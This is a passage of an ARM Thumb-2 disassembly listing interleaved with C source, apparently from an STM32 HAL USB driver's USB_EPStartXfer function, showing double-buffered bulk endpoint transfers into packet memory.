 8006aba:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006abe:	b29b      	uxth	r3, r3
 8006ac0:	461a      	mov	r2, r3
 8006ac2:	693b      	ldr	r3, [r7, #16]
 8006ac4:	4413      	add	r3, r2
 8006ac6:	613b      	str	r3, [r7, #16]
 8006ac8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006acc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ad0:	681b      	ldr	r3, [r3, #0]
 8006ad2:	781b      	ldrb	r3, [r3, #0]
 8006ad4:	00da      	lsls	r2, r3, #3
 8006ad6:	693b      	ldr	r3, [r7, #16]
 8006ad8:	4413      	add	r3, r2
 8006ada:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006ade:	60fb      	str	r3, [r7, #12]
 8006ae0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ae4:	b29a      	uxth	r2, r3
 8006ae6:	68fb      	ldr	r3, [r7, #12]
 8006ae8:	801a      	strh	r2, [r3, #0]
 8006aea:	f000 be1f 	b.w	800772c <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006aee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006af2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006af6:	681b      	ldr	r3, [r3, #0]
 8006af8:	78db      	ldrb	r3, [r3, #3]
 8006afa:	2b02      	cmp	r3, #2
 8006afc:	f040 8462 	bne.w	80073c4 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006b00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b08:	681b      	ldr	r3, [r3, #0]
 8006b0a:	6a1a      	ldr	r2, [r3, #32]
 8006b0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b14:	681b      	ldr	r3, [r3, #0]
 8006b16:	691b      	ldr	r3, [r3, #16]
 8006b18:	429a      	cmp	r2, r3
 8006b1a:	f240 83df 	bls.w	80072dc <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006b1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b22:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b26:	681a      	ldr	r2, [r3, #0]
 8006b28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b2c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b30:	681b      	ldr	r3, [r3, #0]
 8006b32:	781b      	ldrb	r3, [r3, #0]
 8006b34:	009b      	lsls	r3, r3, #2
 8006b36:	4413      	add	r3, r2
 8006b38:	881b      	ldrh	r3, [r3, #0]
 8006b3a:	b29b      	uxth	r3, r3
 8006b3c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b40:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b44:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006b48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b4c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b50:	681a      	ldr	r2, [r3, #0]
 8006b52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b5a:	681b      	ldr	r3, [r3, #0]
 8006b5c:	781b      	ldrb	r3, [r3, #0]
 8006b5e:	009b      	lsls	r3, r3, #2
 8006b60:	441a      	add	r2, r3
 8006b62:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006b66:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b6a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b6e:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006b72:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b76:	b29b      	uxth	r3, r3
 8006b78:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006b7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b82:	681b      	ldr	r3, [r3, #0]
 8006b84:	6a1a      	ldr	r2, [r3, #32]
 8006b86:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b8a:	1ad2      	subs	r2, r2, r3
 8006b8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b90:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b94:	681b      	ldr	r3, [r3, #0]
 8006b96:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006b98:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b9c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ba0:	681a      	ldr	r2, [r3, #0]
 8006ba2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ba6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006baa:	681b      	ldr	r3, [r3, #0]
 8006bac:	781b      	ldrb	r3, [r3, #0]
 8006bae:	009b      	lsls	r3, r3, #2
 8006bb0:	4413      	add	r3, r2
 8006bb2:	881b      	ldrh	r3, [r3, #0]
 8006bb4:	b29b      	uxth	r3, r3
 8006bb6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006bba:	2b00      	cmp	r3, #0
 8006bbc:	f000 81c7 	beq.w	8006f4e <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006bc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bc4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bc8:	681b      	ldr	r3, [r3, #0]
 8006bca:	633b      	str	r3, [r7, #48]	; 0x30
 8006bcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bd4:	681b      	ldr	r3, [r3, #0]
 8006bd6:	785b      	ldrb	r3, [r3, #1]
 8006bd8:	2b00      	cmp	r3, #0
 8006bda:	d177      	bne.n	8006ccc <USB_EPStartXfer+0x2ce>
 8006bdc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006be0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006be4:	681b      	ldr	r3, [r3, #0]
 8006be6:	62bb      	str	r3, [r7, #40]	; 0x28
 8006be8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bf0:	681b      	ldr	r3, [r3, #0]
 8006bf2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006bf6:	b29b      	uxth	r3, r3
 8006bf8:	461a      	mov	r2, r3
 8006bfa:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006bfc:	4413      	add	r3, r2
 8006bfe:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c08:	681b      	ldr	r3, [r3, #0]
 8006c0a:	781b      	ldrb	r3, [r3, #0]
 8006c0c:	00da      	lsls	r2, r3, #3
 8006c0e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c10:	4413      	add	r3, r2
 8006c12:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006c16:	627b      	str	r3, [r7, #36]	; 0x24
 8006c18:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c1a:	881b      	ldrh	r3, [r3, #0]
 8006c1c:	b29b      	uxth	r3, r3
 8006c1e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006c22:	b29a      	uxth	r2, r3
 8006c24:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c26:	801a      	strh	r2, [r3, #0]
 8006c28:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c2c:	2b3e      	cmp	r3, #62	; 0x3e
 8006c2e:	d921      	bls.n	8006c74 <USB_EPStartXfer+0x276>
 8006c30:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c34:	095b      	lsrs	r3, r3, #5
 8006c36:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c3a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c3e:	f003 031f 	and.w	r3, r3, #31
 8006c42:	2b00      	cmp	r3, #0
 8006c44:	d104      	bne.n	8006c50 <USB_EPStartXfer+0x252>
 8006c46:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c4a:	3b01      	subs	r3, #1
 8006c4c:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c50:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c52:	881b      	ldrh	r3, [r3, #0]
 8006c54:	b29a      	uxth	r2, r3
 8006c56:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c5a:	b29b      	uxth	r3, r3
 8006c5c:	029b      	lsls	r3, r3, #10
 8006c5e:	b29b      	uxth	r3, r3
 8006c60:	4313      	orrs	r3, r2
 8006c62:	b29b      	uxth	r3, r3
 8006c64:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c68:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c6c:	b29a      	uxth	r2, r3
 8006c6e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c70:	801a      	strh	r2, [r3, #0]
 8006c72:	e050      	b.n	8006d16 <USB_EPStartXfer+0x318>
 8006c74:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c78:	2b00      	cmp	r3, #0
 8006c7a:	d10a      	bne.n	8006c92 <USB_EPStartXfer+0x294>
 8006c7c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c7e:	881b      	ldrh	r3, [r3, #0]
 8006c80:	b29b      	uxth	r3, r3
 8006c82:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c86:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c8a:	b29a      	uxth	r2, r3
 8006c8c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c8e:	801a      	strh	r2, [r3, #0]
 8006c90:	e041      	b.n	8006d16 <USB_EPStartXfer+0x318>
 8006c92:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c96:	085b      	lsrs	r3, r3, #1
 8006c98:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ca0:	f003 0301 	and.w	r3, r3, #1
 8006ca4:	2b00      	cmp	r3, #0
 8006ca6:	d004      	beq.n	8006cb2 <USB_EPStartXfer+0x2b4>
 8006ca8:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cac:	3301      	adds	r3, #1
 8006cae:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cb2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cb4:	881b      	ldrh	r3, [r3, #0]
 8006cb6:	b29a      	uxth	r2, r3
 8006cb8:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cbc:	b29b      	uxth	r3, r3
 8006cbe:	029b      	lsls	r3, r3, #10
 8006cc0:	b29b      	uxth	r3, r3
 8006cc2:	4313      	orrs	r3, r2
 8006cc4:	b29a      	uxth	r2, r3
 8006cc6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cc8:	801a      	strh	r2, [r3, #0]
 8006cca:	e024      	b.n	8006d16 <USB_EPStartXfer+0x318>
 8006ccc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cd4:	681b      	ldr	r3, [r3, #0]
 8006cd6:	785b      	ldrb	r3, [r3, #1]
 8006cd8:	2b01      	cmp	r3, #1
 8006cda:	d11c      	bne.n	8006d16 <USB_EPStartXfer+0x318>
 8006cdc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ce0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ce4:	681b      	ldr	r3, [r3, #0]
 8006ce6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006cea:	b29b      	uxth	r3, r3
 8006cec:	461a      	mov	r2, r3
 8006cee:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006cf0:	4413      	add	r3, r2
 8006cf2:	633b      	str	r3, [r7, #48]	; 0x30
 8006cf4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cfc:	681b      	ldr	r3, [r3, #0]
 8006cfe:	781b      	ldrb	r3, [r3, #0]
 8006d00:	00da      	lsls	r2, r3, #3
 8006d02:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d04:	4413      	add	r3, r2
 8006d06:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006d0a:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006d0c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d10:	b29a      	uxth	r2, r3
 8006d12:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006d14:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006d16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d1a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d1e:	681b      	ldr	r3, [r3, #0]
 8006d20:	895b      	ldrh	r3, [r3, #10]
 8006d22:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006d26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d2a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d2e:	681b      	ldr	r3, [r3, #0]
 8006d30:	6959      	ldr	r1, [r3, #20]
 8006d32:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d36:	b29b      	uxth	r3, r3
 8006d38:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006d3c:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006d40:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006d44:	6800      	ldr	r0, [r0, #0]
 8006d46:	f001 fb66 	bl	8008416 <USB_WritePMA>
            ep->xfer_buff += len;
 8006d4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d4e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d52:	681b      	ldr	r3, [r3, #0]
 8006d54:	695a      	ldr	r2, [r3, #20]
 8006d56:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d5a:	441a      	add	r2, r3
 8006d5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d64:	681b      	ldr	r3, [r3, #0]
 8006d66:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006d68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d6c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d70:	681b      	ldr	r3, [r3, #0]
 8006d72:	6a1a      	ldr	r2, [r3, #32]
 8006d74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d7c:	681b      	ldr	r3, [r3, #0]
 8006d7e:	691b      	ldr	r3, [r3, #16]
 8006d80:	429a      	cmp	r2, r3
 8006d82:	d90f      	bls.n	8006da4 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006d84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d8c:	681b      	ldr	r3, [r3, #0]
 8006d8e:	6a1a      	ldr	r2, [r3, #32]
 8006d90:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d94:	1ad2      	subs	r2, r2, r3
 8006d96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d9e:	681b      	ldr	r3, [r3, #0]
 8006da0:	621a      	str	r2, [r3, #32]
 8006da2:	e00e      	b.n	8006dc2 <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006da4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dac:	681b      	ldr	r3, [r3, #0]
 8006dae:	6a1b      	ldr	r3, [r3, #32]
 8006db0:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006db4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dbc:	681b      	ldr	r3, [r3, #0]
 8006dbe:	2200      	movs	r2, #0
 8006dc0:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006dc2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dca:	681b      	ldr	r3, [r3, #0]
 8006dcc:	785b      	ldrb	r3, [r3, #1]
 8006dce:	2b00      	cmp	r3, #0
 8006dd0:	d177      	bne.n	8006ec2 <USB_EPStartXfer+0x4c4>
 8006dd2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006dda:	681b      	ldr	r3, [r3, #0]
 8006ddc:	61bb      	str	r3, [r7, #24]
 8006dde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006de6:	681b      	ldr	r3, [r3, #0]
 8006de8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006dec:	b29b      	uxth	r3, r3
 8006dee:	461a      	mov	r2, r3
 8006df0:	69bb      	ldr	r3, [r7, #24]
 8006df2:	4413      	add	r3, r2
 8006df4:	61bb      	str	r3, [r7, #24]
 8006df6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dfa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dfe:	681b      	ldr	r3, [r3, #0]
 8006e00:	781b      	ldrb	r3, [r3, #0]
 8006e02:	00da      	lsls	r2, r3, #3
 8006e04:	69bb      	ldr	r3, [r7, #24]
 8006e06:	4413      	add	r3, r2
 8006e08:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e0c:	617b      	str	r3, [r7, #20]
 8006e0e:	697b      	ldr	r3, [r7, #20]
 8006e10:	881b      	ldrh	r3, [r3, #0]
 8006e12:	b29b      	uxth	r3, r3
 8006e14:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e18:	b29a      	uxth	r2, r3
 8006e1a:	697b      	ldr	r3, [r7, #20]
 8006e1c:	801a      	strh	r2, [r3, #0]
 8006e1e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e22:	2b3e      	cmp	r3, #62	; 0x3e
 8006e24:	d921      	bls.n	8006e6a <USB_EPStartXfer+0x46c>
 8006e26:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e2a:	095b      	lsrs	r3, r3, #5
 8006e2c:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e30:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e34:	f003 031f 	and.w	r3, r3, #31
 8006e38:	2b00      	cmp	r3, #0
 8006e3a:	d104      	bne.n	8006e46 <USB_EPStartXfer+0x448>
 8006e3c:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e40:	3b01      	subs	r3, #1
 8006e42:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e46:	697b      	ldr	r3, [r7, #20]
 8006e48:	881b      	ldrh	r3, [r3, #0]
 8006e4a:	b29a      	uxth	r2, r3
 8006e4c:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e50:	b29b      	uxth	r3, r3
 8006e52:	029b      	lsls	r3, r3, #10
 8006e54:	b29b      	uxth	r3, r3
 8006e56:	4313      	orrs	r3, r2
 8006e58:	b29b      	uxth	r3, r3
 8006e5a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e5e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e62:	b29a      	uxth	r2, r3
 8006e64:	697b      	ldr	r3, [r7, #20]
 8006e66:	801a      	strh	r2, [r3, #0]
 8006e68:	e056      	b.n	8006f18 <USB_EPStartXfer+0x51a>
 8006e6a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e6e:	2b00      	cmp	r3, #0
 8006e70:	d10a      	bne.n	8006e88 <USB_EPStartXfer+0x48a>
 8006e72:	697b      	ldr	r3, [r7, #20]
 8006e74:	881b      	ldrh	r3, [r3, #0]
 8006e76:	b29b      	uxth	r3, r3
 8006e78:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e7c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e80:	b29a      	uxth	r2, r3
 8006e82:	697b      	ldr	r3, [r7, #20]
 8006e84:	801a      	strh	r2, [r3, #0]
 8006e86:	e047      	b.n	8006f18 <USB_EPStartXfer+0x51a>
 8006e88:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e8c:	085b      	lsrs	r3, r3, #1
 8006e8e:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e92:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e96:	f003 0301 	and.w	r3, r3, #1
 8006e9a:	2b00      	cmp	r3, #0
 8006e9c:	d004      	beq.n	8006ea8 <USB_EPStartXfer+0x4aa>
 8006e9e:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ea2:	3301      	adds	r3, #1
 8006ea4:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ea8:	697b      	ldr	r3, [r7, #20]
 8006eaa:	881b      	ldrh	r3, [r3, #0]
 8006eac:	b29a      	uxth	r2, r3
 8006eae:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006eb2:	b29b      	uxth	r3, r3
 8006eb4:	029b      	lsls	r3, r3, #10
 8006eb6:	b29b      	uxth	r3, r3
 8006eb8:	4313      	orrs	r3, r2
 8006eba:	b29a      	uxth	r2, r3
 8006ebc:	697b      	ldr	r3, [r7, #20]
 8006ebe:	801a      	strh	r2, [r3, #0]
 8006ec0:	e02a      	b.n	8006f18 <USB_EPStartXfer+0x51a>
 8006ec2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ec6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006eca:	681b      	ldr	r3, [r3, #0]
 8006ecc:	785b      	ldrb	r3, [r3, #1]
 8006ece:	2b01      	cmp	r3, #1
 8006ed0:	d122      	bne.n	8006f18 <USB_EPStartXfer+0x51a>
 8006ed2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ed6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006eda:	681b      	ldr	r3, [r3, #0]
 8006edc:	623b      	str	r3, [r7, #32]
 8006ede:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ee2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ee6:	681b      	ldr	r3, [r3, #0]
 8006ee8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006eec:	b29b      	uxth	r3, r3
 8006eee:	461a      	mov	r2, r3
 8006ef0:	6a3b      	ldr	r3, [r7, #32]
 8006ef2:	4413      	add	r3, r2
 8006ef4:	623b      	str	r3, [r7, #32]
 8006ef6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006efa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006efe:	681b      	ldr	r3, [r3, #0]
 8006f00:	781b      	ldrb	r3, [r3, #0]
 8006f02:	00da      	lsls	r2, r3, #3
 8006f04:	6a3b      	ldr	r3, [r7, #32]
 8006f06:	4413      	add	r3, r2
 8006f08:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f0c:	61fb      	str	r3, [r7, #28]
 8006f0e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f12:	b29a      	uxth	r2, r3
 8006f14:	69fb      	ldr	r3, [r7, #28]
 8006f16:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006f18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f1c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f20:	681b      	ldr	r3, [r3, #0]
 8006f22:	891b      	ldrh	r3, [r3, #8]
 8006f24:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f2c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f30:	681b      	ldr	r3, [r3, #0]
 8006f32:	6959      	ldr	r1, [r3, #20]
 8006f34:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f38:	b29b      	uxth	r3, r3
 8006f3a:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006f3e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006f42:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006f46:	6800      	ldr	r0, [r0, #0]
 8006f48:	f001 fa65 	bl	8008416 <USB_WritePMA>
 8006f4c:	e3ee      	b.n	800772c <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006f4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f56:	681b      	ldr	r3, [r3, #0]
 8006f58:	785b      	ldrb	r3, [r3, #1]
 8006f5a:	2b00      	cmp	r3, #0
 8006f5c:	d177      	bne.n	800704e <USB_EPStartXfer+0x650>
 8006f5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f62:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f66:	681b      	ldr	r3, [r3, #0]
 8006f68:	64bb      	str	r3, [r7, #72]	; 0x48
 8006f6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f6e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f72:	681b      	ldr	r3, [r3, #0]
 8006f74:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f78:	b29b      	uxth	r3, r3
 8006f7a:	461a      	mov	r2, r3
 8006f7c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006f7e:	4413      	add	r3, r2
 8006f80:	64bb      	str	r3, [r7, #72]	; 0x48
 8006f82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f8a:	681b      	ldr	r3, [r3, #0]
 8006f8c:	781b      	ldrb	r3, [r3, #0]
 8006f8e:	00da      	lsls	r2, r3, #3
 8006f90:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006f92:	4413      	add	r3, r2
 8006f94:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f98:	647b      	str	r3, [r7, #68]	; 0x44
 8006f9a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f9c:	881b      	ldrh	r3, [r3, #0]
 8006f9e:	b29b      	uxth	r3, r3
 8006fa0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006fa4:	b29a      	uxth	r2, r3
 8006fa6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fa8:	801a      	strh	r2, [r3, #0]
 8006faa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fae:	2b3e      	cmp	r3, #62	; 0x3e
 8006fb0:	d921      	bls.n	8006ff6 <USB_EPStartXfer+0x5f8>
 8006fb2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fb6:	095b      	lsrs	r3, r3, #5
 8006fb8:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006fbc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fc0:	f003 031f 	and.w	r3, r3, #31
 8006fc4:	2b00      	cmp	r3, #0
 8006fc6:	d104      	bne.n	8006fd2 <USB_EPStartXfer+0x5d4>
 8006fc8:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006fcc:	3b01      	subs	r3, #1
 8006fce:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
